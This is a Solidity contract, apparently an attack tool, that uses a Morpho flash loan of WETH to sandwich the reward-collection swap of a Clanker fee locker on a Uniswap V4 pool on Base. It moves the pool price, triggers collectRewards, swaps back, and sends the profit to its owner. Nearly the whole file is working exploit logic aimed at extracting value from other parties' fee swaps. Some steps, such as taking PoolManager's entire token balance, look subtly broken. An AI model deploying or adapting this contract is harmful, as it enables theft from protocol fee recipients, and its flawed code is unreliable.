// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IMorpho {
    function flashLoan(address token, uint256 assets, bytes calldata data) external;
}

interface IPoolManager {
    struct SwapParams {
        bool zeroForOne;
        int256 amountSpecified;
        uint160 sqrtPriceLimitX96;
    }
    function unlock(bytes calldata data) external returns (bytes memory);
    function swap(PoolKey memory key, SwapParams memory params, bytes calldata hookData) external returns (int256, int256);
    function settle() external payable returns (uint256);
    function take(address currency, address to, uint256 amount) external;
    function sync(address currency) external;
}

struct PoolKey {
    address currency0;
    address currency1;
    uint24 fee;
    int24 tickSpacing;
    address hooks;
}

interface IClankerLocker {
    function collectRewards(address token) external;
}

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
    function approve(address, uint256) external returns (bool);
}

interface IWETH {
    function deposit() external payable;
    function withdraw(uint256) external;
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
    function approve(address, uint256) external returns (bool);
}

interface IUniversalRouter {
    function execute(bytes calldata commands, bytes[] calldata inputs, uint256 deadline) external payable;
}

contract FlashSandwich {
    address public immutable owner;
    address public constant MORPHO = 0xBBBBBbbBBb9cC5e90e3b3Af64bdAF62C37EEFFCb;
    address public constant WETH = 0x4200000000000000000000000000000000000006;
    address public constant POOL_MANAGER = 0x498581fF718922c3f8e6A244956aF099B2652b2b;
    address public constant UNIVERSAL_ROUTER = 0x6fF5693b99212Da76ad316178A184AB56D299b43;
    address public constant PERMIT2 = 0x000000000022D473030F116dDEE9F6B43aC78BA3;

    struct SandwichParams {
        address token;
        address locker;
        uint256 flashAmount;
        PoolKey poolKey;
    }

    constructor() {
        owner = msg.sender;
    }

    function execute(SandwichParams calldata params) external {
        require(msg.sender == owner, "not owner");

        IMorpho(MORPHO).flashLoan(
            WETH,
            params.flashAmount,
            abi.encode(params)
        );

        // Send all profit to owner
        uint256 wethBal = IERC20(WETH).balanceOf(address(this));
        if (wethBal > 0) IERC20(WETH).transfer(owner, wethBal);

        uint256 ethBal = address(this).balance;
        if (ethBal > 0) payable(owner).transfer(ethBal);
    }

    function onMorphoFlashLoan(uint256 assets, bytes calldata data) external {
        require(msg.sender == MORPHO, "not morpho");

        SandwichParams memory params = abi.decode(data, (SandwichParams));

        uint256 wethBefore = IERC20(WETH).balanceOf(address(this));

        // Step 1: Swap WETH -> token (move price)
        IERC20(WETH).approve(PERMIT2, type(uint256).max);
        IERC20(WETH).approve(UNIVERSAL_ROUTER, type(uint256).max);
        IERC20(WETH).approve(POOL_MANAGER, type(uint256).max);
        IERC20(params.token).approve(PERMIT2, type(uint256).max);
        IERC20(params.token).approve(UNIVERSAL_ROUTER, type(uint256).max);
        IERC20(params.token).approve(POOL_MANAGER, type(uint256).max);

        // Use V4 swap via PoolManager.unlock
        bytes memory unlockData = abi.encode(
            params.poolKey,
            params.token,
            params.flashAmount,
            params.locker,
            true // first swap direction: WETH -> token
        );

        IPoolManager(POOL_MANAGER).unlock(unlockData);

        // Repay flash loan
        IERC20(WETH).transfer(MORPHO, assets);
    }

    function unlockCallback(bytes calldata data) external returns (bytes memory) {
        require(msg.sender == POOL_MANAGER, "not PM");

        (
            PoolKey memory poolKey,
            address token,
            uint256 amount,
            address locker,
            bool isFirstSwap
        ) = abi.decode(data, (PoolKey, address, uint256, address, bool));

        if (isFirstSwap) {
            // Swap 1: WETH -> token (move price up)
            bool zeroForOne = poolKey.currency0 == WETH;

            IPoolManager.SwapParams memory swapParams = IPoolManager.SwapParams({
                zeroForOne: zeroForOne,
                amountSpecified: -int256(amount),
                sqrtPriceLimitX96: zeroForOne
                    ? 4295128740  // MIN + 1
                    : 1461446703485210103287273052203988822378723970341 // MAX - 1
            });

            IPoolManager(POOL_MANAGER).swap(poolKey, swapParams, "");

            // Settle: send WETH to PM
            IPoolManager(POOL_MANAGER).sync(WETH);
            IERC20(WETH).transfer(POOL_MANAGER, amount);
            IPoolManager(POOL_MANAGER).settle();

            // Take: receive tokens from PM
            uint256 tokenOwed = IERC20(token).balanceOf(POOL_MANAGER); // simplified
            IPoolManager(POOL_MANAGER).take(token, address(this), tokenOwed);

            // Step 2: Trigger fee collection (0 slippage swap happens here)
            try IClankerLocker(locker).collectRewards(token) {} catch {}

            // Step 3: Swap tokens back -> WETH
            uint256 tokenBal = IERC20(token).balanceOf(address(this));

            IPoolManager.SwapParams memory reverseParams = IPoolManager.SwapParams({
                zeroForOne: !zeroForOne,
                amountSpecified: -int256(tokenBal),
                sqrtPriceLimitX96: !zeroForOne
                    ? 4295128740
                    : 1461446703485210103287273052203988822378723970341
            });

            IPoolManager(POOL_MANAGER).swap(poolKey, reverseParams, "");

            // Settle token
            IPoolManager(POOL_MANAGER).sync(token);
            IERC20(token).transfer(POOL_MANAGER, tokenBal);
            IPoolManager(POOL_MANAGER).settle();

            // Take WETH
            IPoolManager(POOL_MANAGER).take(WETH, address(this), type(uint256).max);
        }

        return "";
    }

    function rescue(address token) external {
        require(msg.sender == owner, "not owner");
        uint256 bal = IERC20(token).balanceOf(address(this));
        if (bal > 0) IERC20(token).transfer(owner, bal);
    }

    receive() external payable {}
}
